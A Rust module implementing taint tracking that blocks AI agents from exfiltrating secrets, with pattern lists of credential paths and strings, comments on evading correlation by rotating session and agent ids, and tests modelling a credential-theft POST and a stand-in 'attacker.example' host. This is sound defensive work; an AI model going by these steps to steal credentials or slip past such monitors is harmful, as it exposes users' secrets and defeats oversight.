//! LAYER 2, Taint Tracking for Data Flow
//!
//! Every piece of data gets tagged with a taint label at its source.
//! Taint propagates through the flow. When tainted data reaches a
//! sensitive sink → exfiltration detected → block.

use std::collections::{HashMap, HashSet};
use std::sync::Mutex;

use once_cell::sync::Lazy;
use serde::Serialize;

// ── Taint Labels ──

pub const UNTRUSTED_USER: &str = "untrusted_user";
pub const EXTERNAL_TOOL: &str = "external_tool";
pub const LOCAL_FS: &str = "local_fs";
pub const SECRET: &str = "secret";
pub const INTERNAL_API: &str = "internal_api";
pub const SHELL_OUTPUT: &str = "shell_output";
pub const DB_RESULT: &str = "db_result";
pub const NETWORK_RESPONSE: &str = "network_response";

// ── Sink Types ──

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SinkType {
    NetworkEgress,
    FileWrite,
    ShellExec,
    DbWrite,
    EmailSend,
    LogOutput,
}

impl std::fmt::Display for SinkType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SinkType::NetworkEgress => write!(f, "network_egress"),
            SinkType::FileWrite => write!(f, "file_write"),
            SinkType::ShellExec => write!(f, "shell_exec"),
            SinkType::DbWrite => write!(f, "db_write"),
            SinkType::EmailSend => write!(f, "email_send"),
            SinkType::LogOutput => write!(f, "log_output"),
        }
    }
}

// ── Taint Policy ──

struct TaintPolicy {
    sink: SinkType,
    forbidden: &'static [&'static str],
    severity: &'static str,
    description: &'static str,
}

fn default_policies() -> Vec<TaintPolicy> {
    vec![
        TaintPolicy {
            sink: SinkType::NetworkEgress,
            forbidden: &[LOCAL_FS, SECRET, INTERNAL_API, DB_RESULT],
            severity: "critical",
            description: "Sensitive data must not flow to external network",
        },
        TaintPolicy {
            sink: SinkType::EmailSend,
            forbidden: &[SECRET, INTERNAL_API],
            severity: "critical",
            description: "Secrets and internal data must not be sent via email",
        },
        TaintPolicy {
            sink: SinkType::ShellExec,
            forbidden: &[UNTRUSTED_USER, EXTERNAL_TOOL],
            severity: "high",
            description: "Untrusted input must not be used in shell commands",
        },
        TaintPolicy {
            sink: SinkType::DbWrite,
            forbidden: &[UNTRUSTED_USER],
            severity: "high",
            description: "Untrusted user input must not flow to database writes",
        },
        TaintPolicy {
            sink: SinkType::FileWrite,
            forbidden: &[UNTRUSTED_USER],
            severity: "medium",
            description: "Untrusted user input in file writes requires sanitization",
        },
        TaintPolicy {
            sink: SinkType::LogOutput,
            forbidden: &[SECRET],
            severity: "high",
            description: "Secrets must never appear in log output",
        },
    ]
}

// ── Taint Violation ──

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TaintViolation {
    pub description: String,
    pub severity: String,
    pub violating_taints: Vec<String>,
    pub blocked: bool,
}

// ── Analysis Result ──

/// Serialize a label set in a stable order.
///
/// `HashSet` iterates in an order that depends on the hasher's per-process
/// random seed, so the same verdict serialized twice produced the same SET in a
/// different ORDER — measured as 45 differing array positions across two
/// identical runs of the same 42 actions. The set never reached `reasons` or any
/// receipt field, so no signed byte moved; what it did was make the verdict
/// payload impossible to compare byte-for-byte, one code change away from a
/// nondeterministic receipt.
fn sorted_labels<S: serde::Serializer>(v: &HashSet<String>, s: S) -> Result<S::Ok, S::Error> {
    let mut labels: Vec<&String> = v.iter().collect();
    labels.sort();
    s.collect_seq(labels)
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TaintAnalysisResult {
    pub source_taints: Vec<String>,
    pub sink_type: Option<String>,
    #[serde(serialize_with = "sorted_labels")]
    pub accumulated_labels: HashSet<String>,
    pub violations: Vec<TaintViolation>,
    pub blocked: bool,
    pub exfiltration_detected: bool,
    pub summary: String,
}

// ── Session Taint Store ──

struct TimestampedTaint {
    labels: HashSet<String>,
    last_updated: std::time::Instant,
}

static SESSION_TAINTS: Lazy<Mutex<HashMap<String, TimestampedTaint>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));

pub fn get_session_taint(session_id: &str) -> HashSet<String> {
    let store = SESSION_TAINTS.lock().unwrap_or_else(|e| e.into_inner());
    store
        .get(session_id)
        .map(|t| t.labels.clone())
        .unwrap_or_default()
}

/// Clear the process-global per-session taint accumulation. Exposed so
/// deterministic tests can reset the shared `SESSION_TAINTS` map between runs.
pub fn reset_sessions() {
    SESSION_TAINTS
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .clear();
}

pub fn update_session_taint(session_id: &str, labels: &HashSet<String>) {
    let mut store = SESSION_TAINTS.lock().unwrap_or_else(|e| e.into_inner());
    let entry = store
        .entry(session_id.to_string())
        .or_insert_with(|| TimestampedTaint {
            labels: HashSet::new(),
            last_updated: std::time::Instant::now(),
        });
    for l in labels {
        entry.labels.insert(l.clone());
    }
    entry.last_updated = std::time::Instant::now();
}

/// Prune taint data older than the given TTL. Call periodically to prevent unbounded memory growth.
pub fn prune_stale_sessions(ttl: std::time::Duration) -> usize {
    let mut store = SESSION_TAINTS.lock().unwrap_or_else(|e| e.into_inner());
    let now = std::time::Instant::now();
    let before = store.len();
    store.retain(|_, v| now.duration_since(v.last_updated) < ttl);
    before - store.len()
}

/// Hydrate taint labels into the in-memory store (used on startup to load from DB).
pub fn hydrate_session_taint(session_id: &str, labels: HashSet<String>) {
    let mut store = SESSION_TAINTS.lock().unwrap_or_else(|e| e.into_inner());
    store.insert(
        session_id.to_string(),
        TimestampedTaint {
            labels,
            last_updated: std::time::Instant::now(),
        },
    );
}

// ── Agent Taint Store (opt-in) ──

/// Env var enabling agent-scoped taint aggregation, in seconds. Unset or `0`
/// disables it, which is the default.
pub const AGENT_TAINT_WINDOW_ENV: &str = "IAGA_SENTINEL_TAINT_AGENT_WINDOW_SECS";

static AGENT_TAINTS: Lazy<Mutex<HashMap<String, TimestampedTaint>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));

/// The configured agent-aggregation window, or `None` when disabled.
///
/// # Why this is off by default
///
/// Taint is keyed on a `sessionId` the CLIENT chooses, so rotating that id
/// erases the correlation between reading a credential and posting it out.
/// Aggregating by `agent_id` in parallel closes that specific move — but
/// `agent_id` is ALSO client-declared (`InspectRequest::agent_id` is a free
/// string; an API key carries id/label/scope and is not bound to an agent), so
/// the raise is from "rotate one field" to "rotate two". Modest, and worth
/// stating plainly rather than selling.
///
/// The cost is not modest, and it is not a risk but a certainty on one traffic
/// shape. The measured attack posts to an ALLOWLISTED host, so under agent
/// correlation it is observationally IDENTICAL to a developer agent that reads
/// `.env` in one session and calls an allowlisted API in another. Any rule that
/// catches the first catches the second. That is why this ships opt-in, with a
/// window the operator chooses, instead of on by default.
///
/// Binding `sessionId` to the NHI identity — so an agent cannot present a
/// session id it was never issued — is the fix that would not have this cost.
/// It needs an agent/credential binding that does not exist yet, and belongs in
/// its own change.
pub fn agent_taint_window() -> Option<std::time::Duration> {
    let secs = crate::config::env::env_parse(AGENT_TAINT_WINDOW_ENV, 0u64);
    (secs > 0).then(|| std::time::Duration::from_secs(secs))
}

/// Labels accumulated by this AGENT across sessions, within `window`.
///
/// Entries older than the window are ignored rather than merely pruned, so the
/// answer does not depend on when the pruner last ran.
pub fn get_agent_taint(agent_id: &str, window: std::time::Duration) -> HashSet<String> {
    let store = AGENT_TAINTS.lock().unwrap_or_else(|e| e.into_inner());
    store
        .get(agent_id)
        .filter(|t| t.last_updated.elapsed() < window)
        .map(|t| t.labels.clone())
        .unwrap_or_default()
}

/// Payload keys that carry an outbound BODY rather than routing metadata.
///
/// Not an allowlist of safe names — the question it answers is narrow: does this
/// request carry content out, or does it only name where it is going?
const BODY_BEARING_KEYS: [&str; 7] = [
    "body", "data", "content", "payload", "json", "form", "files",
];

/// Whether this action actually carries content outward.
///
/// `{"method":"GET","destination":"https://api.github.com/user/repos"}` does
/// not. `{"method":"POST","destination":"…","body":"<base64>"}` does. The
/// distinction is what separates the measured attack from the measured benign
/// control: both read a credential file and then call an allowlisted host, and
/// only one of them puts anything in the request.
pub fn action_carries_body(payload: &std::collections::HashMap<String, serde_json::Value>) -> bool {
    BODY_BEARING_KEYS.iter().any(|k| {
        payload.get(*k).is_some_and(|v| match v {
            serde_json::Value::Null => false,
            serde_json::Value::String(s) => !s.trim().is_empty(),
            serde_json::Value::Array(a) => !a.is_empty(),
            serde_json::Value::Object(o) => !o.is_empty(),
            _ => true,
        })
    })
}

/// The subset of an agent's cross-session labels that may be inherited.
///
/// # Why this is stricter than the intra-session rule
///
/// Within one session the causal link is DECLARED: the client said these calls
/// belong together, so `LOCAL_FS` reaching `NetworkEgress` is a coherent story —
/// read a file, post it — and `default_policies` blocks it. Across sessions
/// there is no declaration. The link is INFERRED from an `agent_id` the client
/// also chose, over a window an operator guessed. Carrying the same forbidden
/// set across that weaker join is what made the aggregation unusable:
///
///  * measured, aggregation ON, all labels: 19/19 attacks blocked and **2 false
///    positives out of 43 benign controls** (`fprRaw` 0.047). One of the two is
///    a coding agent reading a NON-secret `config/app.json` in one session and
///    calling an allowlisted `api.github.com` in another — the ordinary shape of
///    the thing this product is supposed to let work.
///
/// So the cross-session join carries `SECRET` only, and only when the outbound
/// request actually has a body. `LOCAL_FS`, `DB_RESULT` and `INTERNAL_API` stop
/// at the session boundary; they are strong enough evidence when the client
/// vouched for the sequence and too weak when it did not.
///
/// What this deliberately does NOT catch: reading a credential in one session
/// and posting it out in another **inside a field this function cannot see** —
/// a URL query string, say. The body test is a coarse proxy for "content leaves
/// here", not a content scan.
pub fn cross_session_inheritable(
    agent_labels: &HashSet<String>,
    payload: &std::collections::HashMap<String, serde_json::Value>,
) -> HashSet<String> {
    if !action_carries_body(payload) {
        return HashSet::new();
    }
    agent_labels
        .iter()
        .filter(|l| l.as_str() == SECRET)
        .cloned()
        .collect()
}

/// Accumulate labels against an agent. Always recorded, even when aggregation
/// is disabled, so switching the window on does not start from an empty store
/// and give a misleadingly quiet first window.
pub fn update_agent_taint(agent_id: &str, labels: &HashSet<String>) {
    if labels.is_empty() {
        return;
    }
    let mut store = AGENT_TAINTS.lock().unwrap_or_else(|e| e.into_inner());
    let entry = store
        .entry(agent_id.to_string())
        .or_insert_with(|| TimestampedTaint {
            labels: HashSet::new(),
            last_updated: std::time::Instant::now(),
        });
    for l in labels {
        entry.labels.insert(l.clone());
    }
    entry.last_updated = std::time::Instant::now();
}

/// Prune agent taint older than `ttl`. Twin of [`prune_stale_sessions`].
pub fn prune_stale_agents(ttl: std::time::Duration) -> usize {
    let mut store = AGENT_TAINTS.lock().unwrap_or_else(|e| e.into_inner());
    let now = std::time::Instant::now();
    let before = store.len();
    store.retain(|_, v| now.duration_since(v.last_updated) < ttl);
    before - store.len()
}

/// Reset the agent taint store. Twin of [`reset_sessions`], for tests.
pub fn reset_agents() {
    AGENT_TAINTS
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .clear();
}

/// What the multi-step correlation in this verdict was actually keyed on.
///
/// Surfaced on every response because the honest answer is a limitation: with
/// aggregation off, an attacker who rotates `sessionId` between two beats gets
/// two uncorrelated verdicts, and NOTHING else in the response says so. A
/// reader who is told the basis can judge what the verdict does not cover; a
/// reader who is not told will assume it covered everything.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TaintCorrelationScope {
    /// `"session"` or `"session+agent"`.
    pub basis: String,
    /// Whether the session key came from the caller or was defaulted.
    pub session_id_source: &'static str,
    pub aggregated_by_agent: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub agent_window_secs: Option<u64>,
    pub caveat: &'static str,
}

impl TaintCorrelationScope {
    pub fn describe(
        session_id_was_declared: bool,
        agent_window: Option<std::time::Duration>,
    ) -> Self {
        Self {
            basis: if agent_window.is_some() {
                "session+agent".to_string()
            } else {
                "session".to_string()
            },
            session_id_source: if session_id_was_declared {
                "client-declared metadata.sessionId"
            } else {
                "defaulted to agentId (no sessionId supplied)"
            },
            aggregated_by_agent: agent_window.is_some(),
            agent_window_secs: agent_window.map(|w| w.as_secs()),
            caveat: if agent_window.is_some() {
                // Three limits, and the third is the one an operator who just
                // enabled this will not have thought about. The aggregation
                // store is process-local: behind more than one replica, whether
                // two beats correlate depends on which pod the load balancer
                // picked, so the same attack blocks or does not block for
                // reasons that have nothing to do with the attack. It is stated
                // here rather than left to the chart's comments because this is
                // the field a reader consults when judging one verdict.
                "Multi-step correlation spans this agent's sessions within the window. \
                 Both sessionId and agentId are client-declared, so a caller that rotates \
                 BOTH still presents as unrelated activity. Only the `secret` label \
                 crosses a session boundary, and only into a request carrying a body. \
                 The aggregation store is in-memory and per-process: it resets on restart \
                 and does not span replicas, so behind more than one instance this \
                 correlation is best-effort rather than guaranteed."
            } else {
                "Multi-step correlation is limited to the client-declared sessionId. \
                 A caller that rotates its sessionId between steps is not correlated \
                 across them, and this verdict does not cover that."
            },
        }
    }
}

// ── Source Classification ──

fn is_secret_path(text: &str) -> bool {
    let patterns = [
        ".env",
        ".ssh",
        ".aws",
        "credentials",
        ".gnupg",
        ".npmrc",
        ".pypirc",
        ".netrc",
        "secret",
        "token",
        "passwd",
        "shadow",
        ".pem",
        ".key",
        ".p12",
        "vault",
        ".kube/config",
    ];
    let lower = text.to_lowercase();
    patterns.iter().any(|p| lower.contains(p))
}

fn has_secret_content(text: &str) -> bool {
    let lower = text.to_lowercase();
    let patterns = [
        "api_key",
        "api-key",
        "api_secret",
        "access_token",
        "access-token",
        "private_key",
        "private-key",
        "-----begin",
        "secretref://",
        "bearer ",
        "ghp_",
        "aws_secret",
        "password",
    ];
    patterns.iter().any(|p| lower.contains(p)) || contains_openai_like_key(&lower)
}

fn contains_openai_like_key(text: &str) -> bool {
    text.split(|ch: char| !(ch.is_ascii_alphanumeric() || ch == '-'))
        .any(|token| token.starts_with("sk-") && token.len() >= 20)
}

fn is_internal_url(text: &str) -> bool {
    let lower = text.to_lowercase();
    let patterns = [
        "localhost",
        "127.0.0.1",
        "10.",
        "192.168.",
        ".internal",
        ".local",
        ".corp",
    ];
    patterns.iter().any(|p| lower.contains(p))
}

pub fn classify_source(action_type: &str, _tool_name: &str, payload_str: &str) -> Vec<String> {
    let mut labels = Vec::new();

    match action_type {
        "file_read" => {
            labels.push(LOCAL_FS.into());
            if is_secret_path(payload_str) {
                labels.push(SECRET.into());
            }
        }
        "db_query" => labels.push(DB_RESULT.into()),
        "http" => {
            labels.push(NETWORK_RESPONSE.into());
            if is_internal_url(payload_str) {
                labels.push(INTERNAL_API.into());
            } else {
                labels.push(EXTERNAL_TOOL.into());
            }
        }
        "shell" => labels.push(SHELL_OUTPUT.into()),
        "custom" => labels.push(EXTERNAL_TOOL.into()),
        _ => {}
    }

    if has_secret_content(payload_str) && !labels.contains(&SECRET.to_string()) {
        labels.push(SECRET.into());
    }

    labels
}

pub fn classify_sink(action_type: &str, tool_name: &str) -> Option<SinkType> {
    match action_type {
        "http" => Some(SinkType::NetworkEgress),
        "email" => Some(SinkType::EmailSend),
        "file_write" => Some(SinkType::FileWrite),
        "shell" => Some(SinkType::ShellExec),
        "db_query" => {
            let lower = tool_name.to_lowercase();
            if ["write", "insert", "update", "delete", "drop", "alter"]
                .iter()
                .any(|k| lower.contains(k))
            {
                Some(SinkType::DbWrite)
            } else {
                None
            }
        }
        _ => None,
    }
}

// ── Main Taint Analysis ──

pub fn analyze_taint(
    action_type: &str,
    tool_name: &str,
    payload_str: &str,
    inherited_taints: &HashSet<String>,
) -> TaintAnalysisResult {
    // 1. Source taints
    let source_taints = classify_source(action_type, tool_name, payload_str);

    // 2. Accumulated (inherited + new)
    let mut accumulated: HashSet<String> = inherited_taints.clone();
    for t in &source_taints {
        accumulated.insert(t.clone());
    }

    // 3. Sink classification
    let sink = classify_sink(action_type, tool_name);

    // 4. Check violations
    let mut violations = Vec::new();
    if let Some(ref sink_type) = sink {
        for policy in default_policies() {
            if policy.sink != *sink_type {
                continue;
            }
            let violating: Vec<String> = policy
                .forbidden
                .iter()
                .filter(|t| accumulated.contains(**t))
                .map(|t| t.to_string())
                .collect();

            if !violating.is_empty() {
                let blocked = policy.severity == "critical" || policy.severity == "high";
                violations.push(TaintViolation {
                    description: policy.description.to_string(),
                    severity: policy.severity.to_string(),
                    violating_taints: violating,
                    blocked,
                });
            }
        }
    }

    let blocked = violations.iter().any(|v| v.blocked);
    let exfiltration_detected = violations
        .iter()
        .any(|v| v.description.contains("network") || v.description.contains("email"));

    let sink_str = sink.map(|s| s.to_string());
    // DET-TAINT-1: `accumulated` is a HashSet, so its iteration order is
    // process-randomized. This `summary` is pushed into the signed receipt
    // reasons (notably on the Block/exfiltration path), so sort the labels for a
    // deterministic, reproducible signed string.
    let mut labels_str: Vec<String> = accumulated.iter().cloned().collect();
    labels_str.sort();
    let mut summary = format!("taints: [{}]", labels_str.join(", "));
    if let Some(ref s) = sink_str {
        summary.push_str(&format!(" → sink: {}", s));
    }
    if !violations.is_empty() {
        summary.push_str(&format!(" | {} violation(s)", violations.len()));
    }
    if blocked {
        summary.push_str(" | BLOCKED");
    }
    if exfiltration_detected {
        summary.push_str(" | EXFILTRATION DETECTED");
    }

    TaintAnalysisResult {
        source_taints,
        sink_type: sink_str,
        accumulated_labels: accumulated,
        violations,
        blocked,
        exfiltration_detected,
        summary,
    }
}

#[cfg(test)]
mod agent_scope_tests {
    use super::*;

    /// Guards the property that made `A18` work: taint keyed on a client-chosen
    /// session id does not survive that id being rotated.
    /// Per-test ids, and no `reset_sessions()`, for the same reason as below:
    /// `SESSION_TAINTS` is process-global and these run in parallel.
    #[test]
    fn session_taint_does_not_cross_a_rotated_session_id() {
        let labels: HashSet<String> = ["secret".to_string()].into_iter().collect();
        update_session_taint("scope-rotated-session-a", &labels);

        assert!(get_session_taint("scope-rotated-session-a").contains("secret"));
        assert!(
            get_session_taint("scope-rotated-session-b").is_empty(),
            "session scope is the whole point; if this leaks, the store is not \
             session-keyed at all"
        );
    }

    /// The opt-in aggregation is what closes that, within its window.
    ///
    /// Ids are unique per test and NOTHING here calls `reset_agents()`. The map
    /// is process-global and `cargo test` runs these on parallel threads, so a
    /// sibling's reset used to land between this test's write and its read and
    /// wipe the entry it was about to assert on. Observed once in a full
    /// `--features postgres` run, then reproduced 1-in-3 by widening the gap to
    /// 250ms. Per-test ids make the isolation a property of the data instead of
    /// of the scheduler.
    #[test]
    fn agent_taint_crosses_sessions_inside_the_window() {
        let labels: HashSet<String> = ["secret".to_string()].into_iter().collect();
        update_agent_taint("scope-window-agent", &labels);

        let wide = std::time::Duration::from_secs(3600);
        assert!(get_agent_taint("scope-window-agent", wide).contains("secret"));
        assert!(
            get_agent_taint("scope-window-absent-agent", wide).is_empty(),
            "aggregation is per agent, not global"
        );
    }

    /// A zero-length window must read as "no correlation", not as "unbounded".
    /// The window is checked on READ so the answer does not depend on when the
    /// background pruner last ran.
    #[test]
    fn agent_taint_outside_the_window_is_not_inherited() {
        let labels: HashSet<String> = ["secret".to_string()].into_iter().collect();
        update_agent_taint("scope-zero-window-agent", &labels);

        assert!(get_agent_taint("scope-zero-window-agent", std::time::Duration::ZERO).is_empty());
    }

    /// The disclosure must state the limitation when aggregation is OFF — that
    /// is the case a reader is most likely to over-read, because nothing else
    /// in the response mentions the session id at all.
    #[test]
    fn the_disclosed_scope_names_the_session_rotation_gap() {
        let off = TaintCorrelationScope::describe(true, None);
        assert_eq!(off.basis, "session");
        assert!(!off.aggregated_by_agent);
        assert!(off.agent_window_secs.is_none());
        assert!(
            off.caveat.contains("rotates its sessionId"),
            "the caveat must name the gap, not gesture at it: {}",
            off.caveat
        );

        let on = TaintCorrelationScope::describe(true, Some(std::time::Duration::from_secs(900)));
        assert_eq!(on.basis, "session+agent");
        assert!(on.aggregated_by_agent);
        assert_eq!(on.agent_window_secs, Some(900));
        assert!(
            on.caveat.contains("BOTH"),
            "with aggregation on, the remaining gap is rotating agentId too: {}",
            on.caveat
        );
        assert!(
            on.caveat.contains("does not span replicas"),
            "an operator who enabled this must be told it is per-process, or a \
             multi-replica deployment silently gets a sometimes-control: {}",
            on.caveat
        );
    }

    /// When the caller supplies no session id the key falls back to `agent_id`,
    /// and the response must say so rather than implying a real session.
    #[test]
    fn an_undeclared_session_is_reported_as_defaulted() {
        let scope = TaintCorrelationScope::describe(false, None);
        assert!(scope.session_id_source.contains("defaulted"));
    }

    // ── What crosses a session boundary ──
    //
    // These four reproduce the cases the live suite measured. With the naive
    // "inherit every label" join, `M01` and `M02` were the two false positives
    // that kept aggregation from being shippable; `A18` is the attack it exists
    // to catch. All three read a file and then call out, so no rule that looks
    // only at the sequence can separate them.

    fn payload(pairs: &[(&str, &str)]) -> std::collections::HashMap<String, serde_json::Value> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), serde_json::json!(v)))
            .collect()
    }

    fn labels(of: &[&str]) -> HashSet<String> {
        of.iter().map(|s| (*s).to_string()).collect()
    }

    /// `M01`: a coding agent reads a NON-secret config in one session and calls
    /// an allowlisted host in another. Nothing secret ever existed, so nothing
    /// crosses — this is the case the all-labels join got wrong.
    #[test]
    fn a_non_secret_read_does_not_cross_a_session_boundary() {
        let crossed = cross_session_inheritable(
            &labels(&[LOCAL_FS]),
            &payload(&[("method", "POST"), ("body", "{\"title\":\"bug\"}")]),
        );
        assert!(
            crossed.is_empty(),
            "local_fs must stop at the session boundary even with a body: {crossed:?}"
        );
    }

    /// `M02`: reads `.env`, then a GET with no body. A secret was read, but this
    /// request carries nothing out, so the join does not fire.
    #[test]
    fn a_secret_does_not_cross_into_a_request_with_no_body() {
        let crossed = cross_session_inheritable(
            &labels(&[LOCAL_FS, SECRET]),
            &payload(&[
                ("method", "GET"),
                ("destination", "https://api.github.com/user/repos"),
            ]),
        );
        assert!(
            crossed.is_empty(),
            "a GET that carries nothing out is not an exfiltration beat: {crossed:?}"
        );
    }

    /// `A18`: reads `~/.aws/credentials`, rotates the session id, POSTs the
    /// contents. This is the one that must survive the boundary.
    #[test]
    fn a_secret_crosses_into_a_request_that_carries_a_body() {
        let crossed = cross_session_inheritable(
            &labels(&[LOCAL_FS, SECRET]),
            &payload(&[
                ("method", "POST"),
                ("destination", "https://api.github.com/gists"),
                ("body", "W2RlZmF1bHRdCmF3c19hY2Nlc3Nfa2V5X2lk"),
            ]),
        );
        assert_eq!(
            crossed,
            labels(&[SECRET]),
            "the secret label must cross, and nothing else with it"
        );
    }

    /// `A07`: inside ONE session the rule is unchanged — the client vouched for
    /// the sequence, so `local_fs` reaching the network still blocks. If this
    /// regresses, the narrowing leaked out of the cross-session path and
    /// weakened the layer's main job.
    #[test]
    fn the_intra_session_rule_is_untouched_by_the_narrowing() {
        let result = analyze_taint(
            "http",
            "http.fetch",
            "{\"destination\":\"https://attacker.example/collect\"}",
            &labels(&[LOCAL_FS]),
        );
        assert!(
            result.blocked,
            "local_fs -> network_egress must still block within a session: {}",
            result.summary
        );
    }

    /// An empty or whitespace-only body is not a body. Otherwise every adapter
    /// that always emits `"body": ""` would re-open the case `M02` closes.
    #[test]
    fn an_empty_body_does_not_count_as_carrying_content() {
        assert!(!action_carries_body(&payload(&[
            ("method", "GET"),
            ("body", "   ")
        ])));
        assert!(action_carries_body(&payload(&[("body", "x")])));
    }
}
